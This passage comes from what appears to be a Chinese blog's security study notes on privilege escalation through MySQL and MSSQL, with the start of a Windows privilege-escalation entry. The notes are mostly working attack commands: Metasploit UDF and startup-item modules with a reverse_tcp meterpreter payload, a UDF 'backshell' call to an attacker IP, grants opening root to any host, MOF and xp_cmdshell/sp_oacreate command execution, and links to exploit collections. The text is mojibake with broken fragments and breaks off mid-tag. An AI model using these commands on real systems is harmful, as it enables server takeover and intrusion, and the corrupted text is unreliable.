class="hljs-comment">//èƒ½å¤Ÿå†™å…¥dllæ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h5 id="å¼€å¯å¤–è¿"><a href="#å¼€å¯å¤–è¿" class="headerlink" title="å¼€å¯å¤–è¿"></a>å¼€å¯å¤–è¿</h5><h6 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¿®æ”¹mysqlä¸­userè¡¨æ•°æ®<br></code></pre></td></tr></table></figure><h6 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;IDENTIFIED BY&#x27;root&#x27; WITH GRANT OPTION;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;è´¦å·&#x27;@&#x27;%&#x27;IDENTIFIED BY&#x27;å¯†ç &#x27; WITH GRANT OPTION;<br>-- è¿™æ˜¯ä¸€æ¡MySQLæˆæƒè¯­å¥ï¼Œ<br>ç”¨äºæˆäºˆæŒ‡å®šç”¨æˆ·åœ¨æ‰€æœ‰æ•°æ®åº“å’Œè¡¨ä¸Šæ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä»»ä½•ä¸»æœºä¸Šè¿æ¥åˆ°MySQLæœåŠ¡å™¨<br></code></pre></td></tr></table></figure><h5 id="æŸ¥ç‰ˆæœ¬"><a href="#æŸ¥ç‰ˆæœ¬" class="headerlink" title="æŸ¥ç‰ˆæœ¬"></a>æŸ¥ç‰ˆæœ¬</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">select <span class="hljs-title function_ invoke__">version</span>() <span class="hljs-comment">#æŸ¥ç‰ˆæœ¬</span><br>seTect @@basedir <span class="hljs-comment">#æŸ¥å®‰è£…è·¯å¾„</span><br>UDFå¯¼å…¥å‡½æ¾ˆçš„æ–‡ä»¶ä¸ºdllç±»å‹ï¼Œå…¶å­˜æ”¾çš„ç›®å½•å—ç‰ˆæœ¬å½±å“å¦‚ä¸‹:<br><span class="hljs-number">1</span>.mysql&lt;<span class="hljs-number">5.2</span>    dllå¯¼å‡ºç›®å½•c:/windowsæˆ–system32<br><span class="hljs-number">2</span>.mysql&gt;=<span class="hljs-number">5.2</span>   dllå¯¼å‡ºå®‰è£…ç›®å½•/lib/plugin/<br>  <br>æ²¡æœ‰ç›®å½•é‡‡ç”¨æ‰‹å·¥åˆ›å»ºpluginç›®å½•<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516165917.png" alt="å¾®ä¿¡æˆªå›¾_20230516165917"></p><h5 id="è°ƒç”¨MSF"><a href="#è°ƒç”¨MSF" class="headerlink" title="è°ƒç”¨MSF"></a>è°ƒç”¨MSF</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">ä½¿ç”¨MSFä¸­çš„exploit/multi/mysql/mysql_udf_payload æ¨¡å—å¯ä»¥è¿›è¡ŒUDFææƒ,<br>MSFä¼šå°†d11æ–‡ä»¶å†™å…¥<span class="hljs-number">1</span>ib plugin\ç›®å½•ä¸‹(å‰ææ˜¯è¯¥ç›®å½•å­˜åœ¨ï¼Œéœ€æ‰‹å·¥åˆ›å»º)è¯¥d11æ–‡ä»¶ä¸­åŒ…å«<span class="hljs-title function_ invoke__">sys_exec</span>(å’Œsys_eva10ä¸¤ä¸ªå‡½æ•°ï¼Œ<br><span class="hljs-keyword">use</span> exploit/multi/mysql/mysql_udf_payload<br>set password root<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">1.15</span><br>run<br>æˆåŠŸç”ŸæˆDLLåï¼Œå¯åœ¨fucè¡¨ä¸‹æŸ¥è¯¢<br></code></pre></td></tr></table></figure><h5 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¸Šé¢é»˜è®¤åªåˆ›å»º<span class="hljs-title function_ invoke__">sys_exec</span>()å‡½æ•°ï¼Œè¯¥å‡½æ•°æ‰§è¡Œå¹¶ä¸ä¼šæœ‰å›æ˜¾ã€‚æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»º <span class="hljs-title function_ invoke__">sys_eva1</span>() å‡½æ•°ï¼Œæ¥æ‰§è¡Œæœ‰å›æ˜¾çš„å‘½ä»¤<br><span class="hljs-comment">//2.åˆ›å»ºå‡½æ•°ç»‘å®šdll</span><br>create <span class="hljs-function"><span class="hljs-keyword">function</span> &lt;å‡½æ•°å&gt; <span class="hljs-title">returns</span> <span class="hljs-title">string</span> <span class="hljs-title">soname</span> &quot;&lt;<span class="hljs-title">dll</span>æ–‡ä»¶å&gt;&quot;</span>;<br>create <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sys_eval</span> <span class="hljs-title">returns</span> <span class="hljs-title">string</span> <span class="hljs-title">soname</span> &quot;<span class="hljs-title">KaMeVAyW</span>.<span class="hljs-title">dll</span>&quot;</span>;<br><br>DROP FUNCTION &lt;function_name&gt; <span class="hljs-comment">#åˆ é™¤è‡ªå®šä¹‰å‡½æ•°</span><br><span class="hljs-comment">//3.è°ƒç”¨å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br>select <span class="hljs-title function_ invoke__">sys_eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="MYSQL-MSFå¯åŠ¨é¡¹ææƒ"><a href="#MYSQL-MSFå¯åŠ¨é¡¹ææƒ" class="headerlink" title="MYSQL-MSFå¯åŠ¨é¡¹ææƒ"></a>MYSQL-MSFå¯åŠ¨é¡¹ææƒ</h3><h5 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åŸç†ï¼šä¸Šä¼ æœ¨é©¬åˆ°å¯åŠ¨é¡¹æ–‡ä»¶ï¼Œå½“ç”µè„‘é‡å¯çš„æ—¶å€™ï¼Œå¯åŠ¨é¡¹æ–‡ä»¶è¢«è§¦å‘ï¼Œå®ç°ä¸Šçº¿ã€‚</span><br>é«˜æƒé™è´¦æˆ·<br>secure-fle-priv <span class="hljs-comment">// </span><br></code></pre></td></tr></table></figure><h5 id="MSFé…ç½®"><a href="#MSFé…ç½®" class="headerlink" title="MSFé…ç½®"></a>MSFé…ç½®</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">MSFï¼šï¼ˆå‰æå…ˆå¼€å¤–é“¾ï¼‰<br>use exploit/windows/mysql/mysql_start_up<br>set payload windows/meterpreter/reverse_tcp<br>set rhosts 192.168.88.131<br>set username root<br>set password root<br>set AllowNoCleanup  true<br>run<br></code></pre></td></tr></table></figure><h3 id="MYSQL-MSFåå¼¹shell"><a href="#MYSQL-MSFåå¼¹shell" class="headerlink" title="MYSQL-MSFåå¼¹shell"></a>MYSQL-MSFåå¼¹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use mysql;<br>set @a=concat(&#x27;&#x27;,0x4d5a....);<br>create table Ghost(data LONGBLOB);<br>insert into Ghost values(&quot;&quot;);update Ghost set data = @a;<br>select data from Ghost into DUMPFILE &#x27;E:\\app\\php\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;;<br><br>æ”»å‡»æœºï¼š<br>create function backshell returns string soname &#x27;udf.dll&#x27;;<br>select backshell(&#x27;192.168.234.133&#x27;,8888)  -- kaliæ”»å‡»æœºçš„IP<br></code></pre></td></tr></table></figure><h3 id="MYSQL-MOFææƒ"><a href="#MYSQL-MOFææƒ" class="headerlink" title="MYSQL-MOFææƒ"></a>MYSQL-MOFææƒ</h3><h5 id="åŸç†åŠæ¡ä»¶"><a href="#åŸç†åŠæ¡ä»¶" class="headerlink" title="åŸç†åŠæ¡ä»¶"></a>åŸç†åŠæ¡ä»¶</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åˆ©ç”¨äº†c:/windows/system32/wbem/mof/ç›®å½•ä¸‹çš„ nullevt.mof æ–‡ä»¶ï¼Œæ¯åˆ†é’Ÿéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´å»æ‰§è¡Œä¸€æ¬¡çš„ç‰¹æ€§ï¼Œå†™å…¥æˆ‘ä»¬çš„cmdå‘½ä»¤ä½¿å…¶è¢«å¸¦å…¥æ‰§è¡Œï¼Œä»è€Œæ·»åŠ æ–°ç”¨æˆ·ææƒã€‚</span><br>æµ‹è¯•çš„ä¸»æœºä¸Šè¯¥ç›®å½•ä¸‹å¹¶æ²¡æœ‰è¯¥mofæ–‡ä»¶ï¼Œ<br>å› æ­¤æˆ‘ä»¬ç›´æ¥å¯¼å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚<br>å½“ç„¶è¿™é‡Œéœ€è¦æƒé™ï¼Œä¸€èˆ¬æ¥è¯´MOFæ™®é€šç”¨æˆ·æ˜¯æ— æ³•æ‰§è¡Œæ“ä½œçš„ï¼Œå³ä½¿æ˜¯æ‹¿åˆ°äº†ä¸€ä¸ªshell.<br>ä¹Ÿåªæ˜¯æ™®é€šæƒé™ç”¨æˆ·ï¼Œåˆ©ç”¨æ¡ä»¶æœ‰äº›è‹›åˆ»ã€‚<br>MOFææƒçš„æ¡ä»¶è¦æ±‚ååˆ†ä¸¥è‹›:<br><span class="hljs-number">1</span>.windows <span class="hljs-number">03</span>åŠä»¥ä¸‹ç‰ˆæœ¬<br><span class="hljs-number">2</span>.mysqlæœ‰è¯»å†™ c:/windows/system32/wbem/mof çš„æƒé™<br><span class="hljs-number">3</span>.secure_file_privæ²¡è¿›è¡Œç›®å½•é™åˆ¶<br></code></pre></td></tr></table></figure><h5 id="ä¸Šä¼ MOFæ–‡ä»¶"><a href="#ä¸Šä¼ MOFæ–‡ä»¶" class="headerlink" title="ä¸Šä¼ MOFæ–‡ä»¶"></a>ä¸Šä¼ MOFæ–‡ä»¶</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.mofæ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h5 id="æ‰§è¡Œè¯­å¥"><a href="#æ‰§è¡Œè¯­å¥" class="headerlink" title="æ‰§è¡Œè¯­å¥"></a>æ‰§è¡Œè¯­å¥</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&quot;c:/nullevt.mof&quot;</span>) into dumpfile<span class="hljs-string">&quot;c:/windows /system32 /wbem/mof/nullevt .mof&quot;</span>è¿™é‡Œä¸èƒ½ä½¿ç”¨outfileï¼Œå› ä¸ºä¼šåœ¨æœ«ç«¯å†™å…¥æ–°è¡Œï¼Œå› æ­¤mofåœ¨è¢«å½“ä½œäºŒè¿›åˆ¶æ–‡ä»¶æ— æ³•æ­£å¸¸æ‰§è¡Œ.æ‰€ä»¥æˆ‘ä»¬ç”¨dumpfileå¯¼å‡ºä¸€è¡Œæ•°æ®<br>è¯¥æ–‡ä»¶æ•ˆæœåˆ›å»ºä¸€ä¸ªé«˜æƒé™ç”¨æˆ· (ä»ä¸Šé¢è„šæœ¬å¯çŸ¥è´¦å·å¯†ç ä¸º mofmof)net user username /deTete åˆ é™¤ç”¨æˆ·åˆ ä¸æ‰<br><span class="hljs-comment"># åœæ­¢ winmgmt æœåŠ¡</span><br>372971<br>net stop winmgmt<br><span class="hljs-comment"># åˆ é™¤ Repository æ–‡ä»¶å¤¹</span><br><span class="hljs-built_in">rmdir</span> /s /q C: windows system32 wbem Repository# æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶de1 c: windows system32 wbem mof good nullevt.mof /F /s# åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·net user mofmof /delete<br><span class="hljs-comment">#é‡æ–°å¯åŠ¨æœåŠ¡</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><h5 id="MSFå®ç°"><a href="#MSFå®ç°" class="headerlink" title="MSFå®ç°"></a>MSFå®ç°</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clean">```<br><br>### MSSQL<br><br>##### xp cmdshellææƒ<br><br>```php<br>è´¦å·å¯†ç : sa/admin<br><span class="hljs-comment">// xp_cmdshe11é»˜è®¤åœ¨mssq12000ä¸­æ˜¯å¼€å¯çš„ï¼Œåœ¨mssq12005ä¹‹åçš„ç‰ˆæœ¬ä¸­åˆ™é»˜è®¤ç¦æ­¢ã€‚</span><br>å¦‚æœç”¨æˆ·æ‹¥æœ‰ç®¡ç†å‘˜saæƒé™åˆ™å¯ä»¥ç”¨sp configureé‡ä¿®å¼€å¯å®ƒã€‚<br></code></pre></td></tr></table></figure><h5 id="ç›´æ¥åˆ©ç”¨"><a href="#ç›´æ¥åˆ©ç”¨" class="headerlink" title="ç›´æ¥åˆ©ç”¨"></a>ç›´æ¥åˆ©ç”¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;<br>EXEC master.dbo.xp_cmdshell &#x27;å‘½ä»¤&#x27;<br></code></pre></td></tr></table></figure><h5 id="å¦‚æœè¢«å…³é—­äº†"><a href="#å¦‚æœè¢«å…³é—­äº†" class="headerlink" title="å¦‚æœè¢«å…³é—­äº†"></a>å¦‚æœè¢«å…³é—­äº†</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- å¯ç”¨ï¼š<br>EXEC sp_configure &#x27;show advanced options&#x27;, 1<br>RECONFIGURE;<br>EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br><br>-- ç›¸åº”çš„å…³é—­å‘½ä»¤ä¸ºå…³é—­ï¼š<br><br>exec sp_configure &#x27;show advanced options&#x27;, 1;<br>reconfigure;<br>exec sp_configure &#x27;xp_cmdshell&#x27;, 0;<br>reconfigure;<br></code></pre></td></tr></table></figure><h5 id="å¦‚æœè¢«åˆ é™¤äº†"><a href="#å¦‚æœè¢«åˆ é™¤äº†" class="headerlink" title="å¦‚æœè¢«åˆ é™¤äº†"></a>å¦‚æœè¢«åˆ é™¤äº†</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">```<br><br>##### sp_oacreateææƒ<br><br>```php<br>ä¸»è¦æ˜¯ç”¨æ¥è°ƒç”¨OLEå¯¹è±¡ï¼Œåˆ©ç”¨OLEå¯¹è±¡çš„runæ–¹æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å¯ç”¨:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>ï¼Œ<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;ole Automation Procedures&#x27;</span>ï¼Œ<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br>å…³é—­:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>ï¼Œ<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;ole Automation Procedures&#x27;</span>ï¼Œ<span class="hljs-number">0</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br>æ‰§è¡Œ:<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shel1</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript,shel1&#x27;</span>,<span class="hljs-variable">@shel1</span> output <span class="hljs-keyword">exec</span> sp_oamethod<span class="hljs-variable">@she11</span>,<span class="hljs-string">&#x27;run&#x27;</span>,nul1,<span class="hljs-string">&#x27;c: windows system32 cmd.exe /c whoami &gt;c:  1.txt&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="SOL-Server-æ²™ç›’ææƒ"><a href="#SOL-Server-æ²™ç›’ææƒ" class="headerlink" title="SOL Server æ²™ç›’ææƒ"></a>SOL Server æ²™ç›’ææƒ</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">exec sp_configureshow advanced <span class="hljs-keyword">options</span> ,<span class="hljs-number">1</span>;reconfigure;exec sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">--å…³é—­æ²™ç›’æ¨¡å¼ï¼Œå¦‚æœä¸€æ¬¡æ‰§è¡Œå…¨éƒ¨ä»£ç æœ‰é—®é¢˜ï¼Œå…ˆæ‰§è¡Œä¸Šé¢ä¸¤å¥ä»£ç ã€‚</span><br>exec master ..xp_regwriteHKEY-LOCAL_MACHIN<span class="hljs-string">E&#x27;,&#x27;</span>SOFTWARE Microsoft Jet <span class="hljs-number">4.0</span> Engines<span class="hljs-string">&#x27; , &#x27;</span>sandBoxMod<span class="hljs-string">e&#x27; ,&#x27;</span>REG_DWORD<span class="hljs-string">&#x27;,0:</span><br><span class="hljs-string">--æŸ¥è¯¢æ˜¯å¦æ­£å¸¸å…³é—­ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ²™ç›’æ¨¡å¼æ— è®ºæ˜¯å¼€ï¼Œè¿˜æ˜¯å…³ï¼Œéƒ½ä¸ä¼šå½±å“æˆ‘ä»¬æ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚</span><br><span class="hljs-string">exec master .dbo .xp_regread&#x27;</span>HKEY_LOCAL_MACHIN<span class="hljs-string">E&#x27;SOFTWARE Microsoft Jet 4.0 Engines &#x27;</span>sandBoxMod<span class="hljs-string">e&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><h5 id="MDUT"><a href="#MDUT" class="headerlink" title="MDUT"></a>MDUT</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">https:<span class="hljs-comment">//github.com/SafeGroceryStore/MDUT</span><br></code></pre></td></tr></table></figure><h5 id="LiqunKit"><a href="#LiqunKit" class="headerlink" title="LiqunKit"></a>LiqunKit</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">ç»¼åˆé«˜å±æ¼æ´åˆ©ç”¨å·¥å…·(åŒ…å«å„å¤§æ•°æ®åº“) https:<span class="hljs-comment">//github.com/Liqunkit/LiqunKit</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æƒé™æå‡win</title>
    <link href="/2022/09/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87win/"/>
    <url>/2022/09/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87win/</url>
    
    <content type="html"><![CDATA[<h2 id="ææƒé¢è¯•"><a href="#ææƒé¢è¯•" class="headerlink" title="ææƒé¢è¯•"></a>ææƒé¢è¯•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">è¿›å…¥ç³»ç»Ÿåï¼Œé¦–å…ˆä¿¡æ¯æ”¶é›†ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·åï¼Œç½‘å¡ï¼Œè¡¥ä¸ï¼Œç³»ç»Ÿä¿¡æ¯ï¼Œç³»ç»Ÿç‰ˆæœ¬ï¼Œç„¶åé€šè¿‡è·å–çš„ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯è¿›è¡Œæ‰‹å·¥ææƒï¼Œå¦‚æœæ˜¯ç³»ç»Ÿç‰ˆæœ¬æ˜¯<span class="hljs-number">2000</span>ï¼Œ<span class="hljs-number">2003</span>ï¼Œxpå°±å¯ä»¥ç”¨atç³»ç»Ÿè‡ªå¸¦çš„å‘½ä»¤ææƒï¼Œ<br>  windows <span class="hljs-number">7</span>ã€<span class="hljs-number">8</span>ã€<span class="hljs-number">03</span>ã€<span class="hljs-number">08</span>ã€<span class="hljs-number">12</span>ã€<span class="hljs-number">16</span>å¯ä»¥ç”¨scå‘½ä»¤ï¼Œ<br>  é€‚ç”¨ç‰ˆæœ¬: win2012 &amp; win2008 &amp; Win2016<br>å…¨è‡ªåŠ¨çš„ææƒï¼ŒCSæ’ä»¶ï¼ŒMSF<br></code></pre></td></tr></table></figure><h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">win/linux/æ•°æ®åº“<br><span class="hljs-comment">// ç›®çš„: è·å–æ›´é«˜çº§çš„æƒé™ã€‚---ã€‹ åšæ›´å¤šé«˜æƒé™ç›¸å…³æ“ä½œ</span><br><br>ææƒè·¯å¾„<br>--ã€‹åå°æƒé™ --ã€‹ç³»ç»Ÿæƒé™<br>--ã€‹webæƒé™  --ã€‹ç³»ç»Ÿæƒé™<br>--ã€‹æ•°æ®åº“   --ã€‹ç³»ç»Ÿæƒé™<br>--ã€‹ä¸­é—´ä»¶   --ã€‹ç³»ç»Ÿæƒé™<br>  <br>winæœ€é«˜æƒé™ï¼šsystem<br>linuxæœ€é«˜æƒé™ï¼šroot<br></code></pre></td></tr></table></figure><h4 id="å¸¸è§æƒé™è·å–æ–¹æ³•"><a href="#å¸¸è§æƒé™è·å–æ–¹æ³•" class="headerlink" title="å¸¸è§æƒé™è·å–æ–¹æ³•"></a>å¸¸è§æƒé™è·å–æ–¹æ³•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">åå°æƒé™:SQLæ³¨å…¥ï¼Œæ•°æ®åº“å¤‡ä»½æ³„éœ²ï¼Œé»˜è®¤æˆ–å¼±å£ä»¤ç­‰è·å–å¸å·å¯†ç è¿›å…¥<br>ç½‘ç«™æƒé™:åå°æå‡è‡³ç½‘ç«™æƒé™ï¼ŒRCEæˆ–æ–‡ä»¶æ“ä½œç±»ã€ååºåˆ—åŒ–ç­‰æ¼æ´ç›´è¾¾shell<br>æ•°æ®åº“æƒé™:SQLæ³¨å…¥,æ•°æ®åº“å¤‡ä»½æ³„éœ²ï¼Œé»˜è®¤æˆ–å¼±å£ä»¤ç­‰è¿›å…¥æˆ–ç½‘ç«™æƒé™è·å–åè½¬å…¥<br>æ¥å£æƒé™:SQLæ³¨å…¥,æ•°æ®åº“å¤‡ä»½æ³„éœ²ï¼Œæºç æ³„æ¼ï¼ŒåŸ¹æ¤ä¸å½“ç­‰æˆ–ç½‘ç«™æƒé™è·å–åè½¬å…¥<br>ç³»ç»Ÿæƒé™:é«˜å±ç³»ç»Ÿæ¼æ´ç›´è¾¾æˆ–ç½‘ç«™æƒé™æå‡è½¬å…¥ï¼Œæ•°æ®åº“æƒé™æå‡è½¬å…¥ï¼Œç¬¬ä¸‰æ–¹è½¬å…¥ç­‰<br>åŸŸæ§æƒé™:é«˜å±ç³»ç»Ÿæ¼æ´ç›´è¾¾æˆ–å†…ç½‘æ¨ªå‘æ¸—é€è½¬å…¥ï¼ŒåŸŸæ§å…¶ä»–æœåŠ¡å®‰å…¨è½¬å…¥ç­‰<br></code></pre></td></tr></table></figure><h4 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br><br>![å¾®ä¿¡æˆªå›¾_20230510160433](image/å¾®ä¿¡æˆªå›¾_20230510160433.png)<br><br>#### åŸºç¡€ä¿¡æ¯è·å–<br><br>```php<br>å½“å‰æƒé™             whoami /priv<br>æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€Šä½æ•°)   ver<br>æ¼æ´è¡¥ä¸/æ€è½¯        systeminfo<br>ç½‘ç»œè¿æ¥çŠ¶æ€         tasklist /svg      netstat -ano<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//github.com/k8gege/Ladon     å·¥å…·</span><br>https:<span class="hljs-comment">//github.com/Ascotbe/KernelHub</span><br>https:<span class="hljs-comment">//github.com/nomi-sec/PoC-in-GitHub</span><br>https:<span class="hljs-comment">//github.com/offensive-security/exploitdb</span><br>http:<span class="hljs-comment">//cve.mitre.org/data/refs/refmap/source-MS.html</span><br></code></pre></td></tr></table></figure><h3 id="msfå…¨è‡ªåŠ¨ææƒ"><a href="#msfå…¨è‡ªåŠ¨ææƒ" class="headerlink" 